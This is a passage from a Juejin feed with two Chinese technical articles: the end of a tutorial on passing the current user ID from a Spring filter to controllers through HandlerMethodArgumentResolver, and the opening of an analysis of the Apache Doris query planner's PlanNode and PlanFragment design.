                request.setAttribute(<span class="hljs-string">"currentUserId"</span>, userId);
            } <span class="hljs-keyword">catch</span> (<span class="hljs-type">Exception</span> e) {
                <span class="hljs-comment">// token 无效，继续执行后续逻辑</span>
            }
        }

        filterChain.doFilter(request, response);
    }
}
</code></pre>
<h2 data-id="heading-10">Controller 层面</h2>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@RestController</span>
<span class="hljs-variable">@RequestMapping</span>(<span class="hljs-string">"/api/users"</span>)
public class UserController {

    <span class="hljs-variable">@Autowired</span>
    private UserService userService;

    <span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">"/me"</span>)
    public ResponseEntity&lt;User&gt; <span class="hljs-built_in">getCurrentUser</span>(<span class="hljs-variable">@CurrentUser</span> Long userId) {
        <span class="hljs-comment">// userId 被"魔法般"地自动注入了！</span>
        <span class="hljs-selector-tag">User</span> <span class="hljs-selector-tag">user</span> = <span class="hljs-selector-tag">userService</span><span class="hljs-selector-class">.findById</span>(userId);
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">ResponseEntity</span><span class="hljs-selector-class">.ok</span>(user);
    }

    @<span class="hljs-selector-tag">PutMapping</span>(<span class="hljs-string">"/me"</span>)
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">ResponseEntity</span>&lt;<span class="hljs-selector-tag">User</span>&gt; <span class="hljs-selector-tag">updateCurrentUser</span>(<span class="hljs-variable">@CurrentUser</span> Long userId,
                                                 <span class="hljs-variable">@RequestBody</span> UserUpdateRequest request) {
        <span class="hljs-comment">// 每个 Controller 方法都可以直接使用 @CurrentUser</span>
        <span class="hljs-selector-tag">User</span> <span class="hljs-selector-tag">updatedUser</span> = <span class="hljs-selector-tag">userService</span><span class="hljs-selector-class">.updateUser</span>(userId, request);
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">ResponseEntity</span><span class="hljs-selector-class">.ok</span>(updatedUser);
    }

    @<span class="hljs-selector-tag">GetMapping</span>(<span class="hljs-string">"/permissions"</span>)
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">ResponseEntity</span>&lt;<span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">Permission</span>&gt;&gt; <span class="hljs-selector-tag">getUserPermissions</span>(<span class="hljs-variable">@CurrentUser</span> Long userId) {
        <span class="hljs-comment">// 完全类型安全，无需手动类型转换</span>
        <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">Permission</span>&gt; <span class="hljs-selector-tag">permissions</span> = <span class="hljs-selector-tag">userService</span><span class="hljs-selector-class">.getUserPermissions</span>(userId);
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">ResponseEntity</span><span class="hljs-selector-class">.ok</span>(permissions);
    }
}
</code></pre>
<h2 data-id="heading-11">原理解析</h2>
<h2 data-id="heading-12">HandlerMethodArgumentResolver 工作流程</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37c6855cd485461d92e95dc0454a429d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287797&amp;x-signature=UW8bK%2Bgz2LFY8t1C8s0yJUYhqd4%3D" alt="" loading="lazy"/></p>
<p>在这个流程中，Spring MVC 会按照注册的顺序遍历所有的 HandlerMethodArgumentResolver，对于每个需要解析的参数，都会调用 supportsParameter() 方法判断是否支持，如果支持则调用 resolveArgument() 方法进行实际的参数解析。</p>
<h2 data-id="heading-13">方案优势</h2>
<p>这个方案的优势不仅体现在代码层面，更重要的是它符合软件工程的多个重要原则：</p>
<p><strong>1. 类型安全</strong>：编译时检查，避免运行时类型转换错误。当你错误地将 @CurrentUser Long 写成 @CurrentUser String 时，编译器会立刻提醒你。</p>
<p><strong>2. 代码简洁</strong>：Controller 方法专注于业务逻辑。不再需要每次都写 request.getAttribute() 的样板代码，让业务逻辑更加清晰。</p>
<p><strong>3. 可测试性</strong>：Mock 变得简单直接。在单元测试中，你只需要模拟参数值，而不需要构建整个 HttpServletRequest 对象。</p>
<p><strong>4. 可维护性</strong>：统一的用户信息获取方式。当需要修改用户信息的获取逻辑时，只需要修改 Resolver，而不需要修改每个 Controller 方法。</p>
<p><strong>5. 扩展性</strong>：轻松支持更多用户相关属性。通过修改 Resolver 的逻辑，可以支持返回 User 对象、用户权限、用户偏好设置等复杂信息。</p>
<p><strong>6. 关注点分离</strong>：Filter 专注于认证逻辑，Resolver 专注于参数解析，Controller 专注于业务逻辑，各司其职，代码结构更加清晰。</p>
<h2 data-id="heading-14">进阶用法：传递完整用户对象</h2>
<p>在真实的项目中，我们往往需要的不仅仅是用户 ID，而是完整的用户信息、权限数据、或者用户偏好设置。HandlerMethodArgumentResolver 的强大之处就在于它可以智能地根据参数类型返回不同的对象。</p>
<h2 data-id="heading-15">扩展解析器支持复杂对象</h2>
<p>这里的核心思想是<strong>根据 Controller 方法的参数类型动态决定返回什么对象</strong>，这样可以最大程度地提高代码的灵活性和复用性。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CurrentUserArgumentResolver</span> <span class="hljs-title">implements</span> <span class="hljs-title">HandlerMethodArgumentResolver</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> boolean supportsParameter(MethodParameter parameter) {
        <span class="hljs-keyword">return</span> parameter.hasParameterAnnotation(CurrentUser.<span class="hljs-keyword">class</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object resolveArgument(MethodParameter parameter,
                                 ModelAndViewContainer mavContainer,
                                 NativeWebRequest webRequest,
                                 WebDataBinderFactory binderFactory) throws Exception {

        <span class="hljs-built_in">Long</span> userId = (<span class="hljs-built_in">Long</span>) webRequest.getAttribute(<span class="hljs-string">"currentUserId"</span>, WebRequest.SCOPE_REQUEST);

        <span class="hljs-keyword">if</span> (userId == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 或者抛出异常</span>
        }

        <span class="hljs-comment">// 根据参数类型决定返回什么</span>
        Class&lt;?&gt; parameterType = parameter.getParameterType();

        <span class="hljs-keyword">if</span> (parameterType == <span class="hljs-built_in">Long</span>.<span class="hljs-keyword">class</span> || parameterType == long.<span class="hljs-keyword">class</span>) {
            <span class="hljs-keyword">return</span> userId;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (parameterType == User.<span class="hljs-keyword">class</span>) {
            <span class="hljs-keyword">return</span> userService.findById(userId);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (parameterType == UserProfile.<span class="hljs-keyword">class</span>) {
            <span class="hljs-keyword">return</span> userService.getUserProfile(userId);
        }

        <span class="hljs-keyword">throw</span> new IllegalArgumentException(<span class="hljs-string">"Unsupported parameter type: "</span> + parameterType);
    }
}
</code></pre>
<h2 data-id="heading-16">Controller 中的多种用法</h2>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@RestController</span>
<span class="hljs-variable">@RequestMapping</span>(<span class="hljs-string">"/api"</span>)
public class AdvancedUserController {

    <span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">"/user/id"</span>)
    public ResponseEntity&lt;String&gt; <span class="hljs-built_in">getUserId</span>(<span class="hljs-variable">@CurrentUser</span> Long userId) {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">ResponseEntity</span><span class="hljs-selector-class">.ok</span>(<span class="hljs-string">"User ID: "</span> + userId);
    }

    @<span class="hljs-selector-tag">GetMapping</span>(<span class="hljs-string">"/user/info"</span>)
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">ResponseEntity</span>&lt;<span class="hljs-selector-tag">User</span>&gt; <span class="hljs-selector-tag">getUserInfo</span>(<span class="hljs-variable">@CurrentUser</span> User user) {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">ResponseEntity</span><span class="hljs-selector-class">.ok</span>(user);
    }

    @<span class="hljs-selector-tag">GetMapping</span>(<span class="hljs-string">"/user/profile"</span>)
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">ResponseEntity</span>&lt;<span class="hljs-selector-tag">UserProfile</span>&gt; <span class="hljs-selector-tag">getUserProfile</span>(<span class="hljs-variable">@CurrentUser</span> UserProfile profile) {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">ResponseEntity</span><span class="hljs-selector-class">.ok</span>(profile);
    }
}
</code></pre>
<h2 data-id="heading-17">实战技巧与注意事项</h2>
<p>在实际项目中使用 HandlerMethodArgumentResolver 时，还需要考虑一些实际的工程问题。下面是一些常见的场景和解决方案。</p>
<h2 data-id="heading-18">1. 异常处理</h2>
<p>在用户未登录或者 Token 无效的情况下，我们需要优雅地处理异常情况，而不是让系统抛出难以理解的错误信息。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CurrentUserArgumentResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodArgumentResolver</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(...)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> (Long) webRequest.getAttribute(<span class="hljs-string">"currentUserId"</span>, WebRequest.SCOPE_REQUEST);

        <span class="hljs-keyword">if</span> (userId == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnauthorizedException</span>(<span class="hljs-string">"用户未登录"</span>);
        }

        <span class="hljs-keyword">return</span> userId;
    }
}

<span class="hljs-meta">@ControllerAdvice</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalExceptionHandler</span> {

    <span class="hljs-meta">@ExceptionHandler(UnauthorizedException.class)</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;String&gt; <span class="hljs-title function_">handleUnauthorized</span><span class="hljs-params">(UnauthorizedException e)</span> {
        <span class="hljs-keyword">return</span> ResponseEntity.status(<span class="hljs-number">401</span>).body(e.getMessage());
    }
}
</code></pre>
<h2 data-id="heading-19">2. 与 <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D266261738%26content_type%3DArticle%26match_order%3D1%26q%3DSpring%2BSecurity%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=266261738&amp;content_type=Article&amp;match_order=1&amp;q=Spring+Security&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Spring Security</a> 集成</h2>
<p>在许多企业级应用中，我们使用 Spring Security 进行认证和授权。如何将 Spring Security 的用户信息与我们的自定义 Resolver 结合使用是一个常见问题。</p>
<p>Spring Security 提供了 SecurityContextHolder 来存储当前用户的认证信息，我们可以直接从中获取用户详情，然后转换成我们需要的格式。这种集成方式的优势是可以复用 Spring Security 的完整认证体系，包括各种认证方式（JWT、OAuth2、Session 等）。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CurrentUserArgumentResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodArgumentResolver</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(...)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">Authentication</span> <span class="hljs-variable">authentication</span> <span class="hljs-operator">=</span> SecurityContextHolder.getContext().getAuthentication();

        <span class="hljs-keyword">if</span> (authentication != <span class="hljs-literal">null</span> &amp;&amp; authentication.isAuthenticated()) {
            <span class="hljs-type">UserDetails</span> <span class="hljs-variable">userDetails</span> <span class="hljs-operator">=</span> (UserDetails) authentication.getPrincipal();
            <span class="hljs-keyword">return</span> Long.parseLong(userDetails.getUsername()); <span class="hljs-comment">// 假设username存储的是userId</span>
        }

        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<h2 data-id="heading-20">3. <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D266261738%26content_type%3DArticle%26match_order%3D1%26q%3D%25E5%25A4%259A%25E7%25A7%259F%25E6%2588%25B7%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=266261738&amp;content_type=Article&amp;match_order=1&amp;q=%E5%A4%9A%E7%A7%9F%E6%88%B7&amp;zhida_source=entity" ref="nofollow noopener noreferrer">多租户</a>场景</h2>
<p>在 SaaS 应用中，多租户是一个常见的需求。除了当前用户信息，我们还需要知道当前租户的信息。通过创建多个自定义注解和对应的 Resolver，我们可以轻松实现这种需求。</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Target</span>(ElementType.PARAMETER)
<span class="hljs-variable">@Retention</span>(RetentionPolicy.RUNTIME)
public <span class="hljs-variable">@interface</span> CurrentTenant {
}

<span class="hljs-variable">@Component</span>
public class CurrentTenantArgumentResolver implements HandlerMethodArgumentResolver {

    <span class="hljs-variable">@Override</span>
    public boolean <span class="hljs-built_in">supportsParameter</span>(MethodParameter parameter) {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">parameter</span><span class="hljs-selector-class">.hasParameterAnnotation</span>(CurrentTenant.class);
    }

    @<span class="hljs-selector-tag">Override</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">Object</span> <span class="hljs-selector-tag">resolveArgument</span>(...) <span class="hljs-selector-tag">throws</span> <span class="hljs-selector-tag">Exception</span> {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">webRequest</span><span class="hljs-selector-class">.getAttribute</span>(<span class="hljs-string">"currentTenantId"</span>, WebRequest.SCOPE_REQUEST);
    }
}

@<span class="hljs-selector-tag">GetMapping</span>(<span class="hljs-string">"/tenant/data"</span>)
<span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">ResponseEntity</span>&lt;<span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">Data</span>&gt;&gt; <span class="hljs-selector-tag">getTenantData</span>(<span class="hljs-variable">@CurrentUser</span> Long userId,
                                               <span class="hljs-variable">@CurrentTenant</span> Long tenantId) {
    <span class="hljs-comment">// 同时获取当前用户和租户信息</span>
    <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">Data</span>&gt; <span class="hljs-selector-tag">data</span> = <span class="hljs-selector-tag">dataService</span><span class="hljs-selector-class">.findByUserAndTenant</span>(userId, tenantId);
    <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">ResponseEntity</span><span class="hljs-selector-class">.ok</span>(data);
}
</code></pre>
<h2 data-id="heading-21">总结</h2>
<p>通过 Spring MVC 的 HandlerMethodArgumentResolver我们实现了一个可以"跨 Filter 与 Controller 传参"的技术实现方案。将底层 Servlet API 的 request.getAttribute() 操作抽象为编译时类型安全的方法参数注入，实现了框架层面的参数解析适配，既保持了架构的纯净性，又提供了强大的扩展能力。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入doris查询计划以及io调度（一）查询规划器planner]]></title>    <link>https://juejin.cn/post/7591882877311729716</link>    <guid>https://juejin.cn/post/7591882877311729716</guid>    <pubDate>2026-01-06T07:45:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591882877311729716" data-draft-id="7591882877311664180" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入doris查询计划以及io调度（一）查询规划器planner"/> <meta itemprop="keywords" content="数据库"/> <meta itemprop="datePublished" content="2026-01-06T07:45:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="语落心生"/> <meta itemprop="url" content="https://juejin.cn/user/2875978147955741"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入doris查询计划以及io调度（一）查询规划器planner
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2875978147955741/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    语落心生
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:45:35.000Z" title="Tue Jan 06 2026 07:45:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近Apache Geaflow需要实现异步资源调度，经过和社区成员的沟通后，发现可以沿着doris分片调度的思路去走，故有此系列</p>
<hr/>
<h3 data-id="heading-0">导读</h3>
<ol>
<li><strong>What</strong>：Planner 包含哪些核心组件？PlanNode、PlanFragment 的设计是什么？</li>
<li><strong>Why</strong>：为什么需要将查询计划分片（Fragment）？为什么需要单机计划和分布式计划两个阶段？</li>
<li><strong>How</strong>：Doris 如何构建 PlanNode 树？如何生成分布式执行计划？</li>
<li><strong>How</strong>：各类 PlanNode（Scan、Join、Agg）如何实现？分布式策略如何选择？</li>
</ol>
<h3 data-id="heading-1">核心概念</h3>
<ul>
<li><strong>Planner 架构</strong>：抽象基类 Planner 与 NereidsPlanner 实现</li>
<li><strong>PlanNode 树</strong>：OlapScanNode、HashJoinNode、AggregationNode 等节点实现</li>
<li><strong>PlanFragment</strong>：查询计划的片段化执行单元</li>
<li><strong>分布式计划生成</strong>：DistributePlanner、FragmentExecParams</li>
<li><strong>Backend 选择</strong>：根据数据分布选择执行节点</li>
<li><strong>Runtime Filter</strong>：动态过滤器的生成与应用</li>
<li><strong>数据分区策略</strong>：Shuffle、Broadcast、Colocate Join</li>
<li><strong>Nereids vs 传统 Planner</strong>：新旧优化器对比</li>
</ul>
<hr/>
<h2 data-id="heading-2">1. Planner 整体架构（What &amp; Why）</h2>
<h3 data-id="heading-3">1.1 Planner 在查询处理中的位置</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[已分析的AST] --&gt; B[Planner]
    B --&gt; C[PlanNode树生成]
    C --&gt; D[单节点逻辑计划]
    D --&gt; E[分布式计划转换]
    E --&gt; F[PlanFragment列表]
    F --&gt; G[Coordinator协调器]
    G --&gt; H[BE执行]
</code></pre>
<h3 data-id="heading-4">1.2 Planner 抽象基类设计</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/planner/Planner.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Planner</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">LOG</span> <span class="hljs-operator">=</span> LogManager.getLogger(Planner.class);
    
    <span class="hljs-comment">// 查询计划被分解为多个 Fragment（片段）</span>
    <span class="hljs-keyword">protected</span> ArrayList&lt;PlanFragment&gt; fragments = Lists.newArrayList();
    
    <span class="hljs-comment">// 查询配置选项</span>
    <span class="hljs-keyword">protected</span> TQueryOptions queryOptions;
    
    <span class="hljs-comment">// 子类必须实现的核心方法</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> List&lt;ScanNode&gt; <span class="hljs-title function_">getScanNodes</span><span class="hljs-params">()</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">plan</span><span class="hljs-params">(StatementBase queryStmt, 
                              TQueryOptions queryOptions)</span> <span class="hljs-keyword">throws</span> UserException;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> DescriptorTable <span class="hljs-title function_">getDescTable</span><span class="hljs-params">()</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> List&lt;RuntimeFilter&gt; <span class="hljs-title function_">getRuntimeFilters</span><span class="hljs-params">()</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> Optional&lt;ResultSet&gt; <span class="hljs-title function_">handleQueryInFe</span><span class="hljs-params">(StatementBase parsedStmt)</span>;
    
    <span class="hljs-keyword">public</span> List&lt;PlanFragment&gt; <span class="hljs-title function_">getFragments</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> fragments;
    }
}
</code></pre>
<p><strong>设计要点</strong>：</p>
<ol>
<li><strong>抽象基类模式</strong>：定义统一接口，支持多种 Planner 实现</li>
<li><strong>Fragment 列表</strong>：查询被分解为多个可独立执行的片段</li>
<li><strong>扩展点</strong>：
<ul>
<li><code>plan()</code> 方法：核心规划逻辑</li>
<li><code>getScanNodes()</code> 方法：获取所有扫描节点</li>
<li><code>getRuntimeFilters()</code> 方法：获取运行时过滤器</li>
<li><code>handleQueryInFe()</code> 方法：FE 端直接处理的查询</li>
</ul>
</li>
</ol>
<h3 data-id="heading-5">1.3 Planner 实现层次</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[Planner 抽象基类] --&gt; B[NereidsPlanner]
    A --&gt; C[GroupCommitPlanner]
    B --&gt; D[PrepareCommandPlanner]
    B --&gt; E[FastInsertIntoValuesPlanner]
</code></pre>
<p><strong>主要实现类</strong>：</p>
<ol>
<li>
<p><strong>NereidsPlanner</strong>：新一代优化器的 Planner</p>
<ul>
<li>位置：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/NereidsPlanner.java</code></li>
<li>基于 Cascades 框架的 CBO 优化器</li>
<li>支持更丰富的优化规则和统计信息</li>
</ul>
</li>
<li>
<p><strong>GroupCommitPlanner</strong>：Group Commit 场景的 Planner</p>
<ul>
<li>位置：<code>fe/fe-core/src/main/java/org/apache/doris/planner/GroupCommitPlanner.java</code></li>
<li>针对批量写入优化</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-6">2. PlanNode 节点树设计</h2>
<h3 data-id="heading-7">2.1 PlanNode 抽象基类</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/planner/PlanNode.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PlanNode</span> {
    <span class="hljs-keyword">protected</span> PlanNodeId id;          <span class="hljs-comment">// 节点唯一标识</span>
    <span class="hljs-keyword">protected</span> PlanFragmentId fragmentId;  <span class="hljs-comment">// 所属 Fragment ID</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-type">long</span> limit;             <span class="hljs-comment">// LIMIT 限制</span>
    <span class="hljs-keyword">protected</span> List&lt;TupleId&gt; tupleIds;     <span class="hljs-comment">// 输出的 Tuple ID 列表</span>
    <span class="hljs-keyword">protected</span> List&lt;TupleId&gt; nullableTupleIds;  <span class="hljs-comment">// 可为 NULL 的 Tuple ID</span>
    <span class="hljs-keyword">protected</span> List&lt;Expr&gt; conjuncts;   <span class="hljs-comment">// 谓词条件（WHERE 子句）</span>
    <span class="hljs-keyword">protected</span> List&lt;RuntimeFilter&gt; runtimeFilters;  <span class="hljs-comment">// 运行时过滤器</span>
    <span class="hljs-keyword">protected</span> ArrayList&lt;PlanNode&gt; children;  <span class="hljs-comment">// 子节点</span>
    
